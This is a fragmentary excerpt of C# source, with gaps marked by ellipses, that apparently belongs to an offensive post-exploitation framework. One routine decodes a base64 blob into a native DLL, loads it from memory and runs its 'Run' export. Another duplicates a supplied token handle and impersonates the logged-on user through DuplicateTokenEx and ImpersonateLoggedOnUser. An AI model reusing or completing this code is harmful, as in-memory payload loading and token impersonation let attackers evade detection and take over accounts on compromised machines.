...
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate IntPtr RunDelegate();
    public static string run(string d)
    {
 	    string result = "";
        try 
		{					
            DLLFromMemory dll = new DLLFromMemory(Convert.FromBase64String(d));
			result += "[!] Native DLL loaded, now executing:\n";

            RunDelegate RunFunc = dll.GetDelegateFromFuncName<RunDelegate>("Run");
            IntPtr res = RunFunc();
...
{
    public static string run(string a, string d)
    {
        string result;
		int n;
        try 
		{		
			...
			{
			    result = RunThings(a, d);
			}

			else
		    {
				result = "[!] Wrong paramameters supplied\n";
     		}
        }
		catch (Exception e)
		{
	...
	protected static string RunThings (string hnd, string d)
	{

		IntPtr token = new IntPtr(Int32.Parse(hnd));
	    ...
	    {
			return "[!] Call to DuplicateTokenEx failed.";
	    }
        ...
        {
            res =  "[!] ImpersonateLoggedOnUser Failed";
        }
